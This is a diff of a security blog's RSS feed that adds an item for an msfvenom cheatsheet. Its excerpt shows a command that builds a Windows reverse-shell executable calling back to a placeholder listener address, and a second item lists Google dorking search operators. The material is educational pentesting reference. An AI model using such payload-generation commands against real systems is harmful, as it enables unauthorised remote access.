@@ -7,13 +7,27 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-    <lastBuildDate>Mon, 15 Aug 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://kafkaesc.com/categories/cheatsheets/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 30 Aug 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://kafkaesc.com/categories/cheatsheets/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Google Dorking Cheat Sheet</title>
-      <link>https://kafkaesc.com/posts/2022/08/google-dorking-cheat-sheet/</link>
+      <title>msfvenom Cheatsheet</title>
+      <link>https://kafkaesc.com/posts/2022/08/msfvenom-cheatsheet/</link>
+      <pubDate>Tue, 30 Aug 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kafkaesc.com/posts/2022/08/msfvenom-cheatsheet/</guid>
+      <description>The standard syntax for msfvenom is as follows:
+msfvenom -p &amp;lt;PAYLOAD&amp;gt; &amp;lt;OPTIONS&amp;gt;
+For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&amp;lt;listen-IP&amp;gt; LPORT=&amp;lt;listen-port&amp;gt;
+Staged vs Stageless There are two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.
+  Staged payloads are sent in two parts. The first part is called the stager.</description>
+    </item>
+    
+    <item>
+      <title>Google Dorking Cheatsheet</title>
+      <link>https://kafkaesc.com/posts/2022/08/google-dorking-cheatsheet/</link>
       <pubDate>Mon, 15 Aug 2022 00:00:00 +0000</pubDate>
       
-      <guid>https://kafkaesc.com/posts/2022/08/google-dorking-cheat-sheet/</guid>
+      <guid>https://kafkaesc.com/posts/2022/08/google-dorking-cheatsheet/</guid>
       <description>Search filters    Filter Description Example     allintext Searches for occurrences of all the keywords given. allintext:&amp;quot;keyword&amp;quot;   intext Searches for the occurrences of keywords all at once or one at a time. intext:&amp;quot;keyword&amp;quot;   inurl Searches for a URL matching one of the keywords. inurl:&amp;quot;keyword&amp;quot;   allinurl Searches for a URL matching all the keywords in the query. allinurl:&amp;quot;keyword&amp;quot;   intitle Searches for occurrences of keywords in title all or one.</description>
     </item>
     
